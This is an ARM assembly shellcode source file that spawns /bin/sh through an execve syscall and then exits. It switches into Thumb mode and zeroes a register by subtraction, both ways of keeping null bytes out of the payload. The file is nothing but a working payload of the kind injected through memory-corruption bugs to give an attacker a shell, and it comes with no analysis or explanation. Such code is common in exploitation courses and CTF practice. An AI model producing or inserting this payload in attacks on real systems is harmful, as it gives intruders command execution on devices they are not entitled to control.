
.text
.global _start
_start:
  @ execve("/bin/sh",["/bin/sh", 0], 0)
  .code 32
  add r6, pc, #1  @ turn on the least-significant bit of the program counter 
  bx r6           @ Branch and Exchange
  .code 16
  mov r0, pc
  add r0, #16
  sub r2, r2, r2
  push {r0, r2}
  mov r1, sp
  mov r7, #11
  swi #0
_exit:
  mov r0, #0
  mov r7, #1
  swi #0          @ exit(0)
.asciz "/bin/sh"
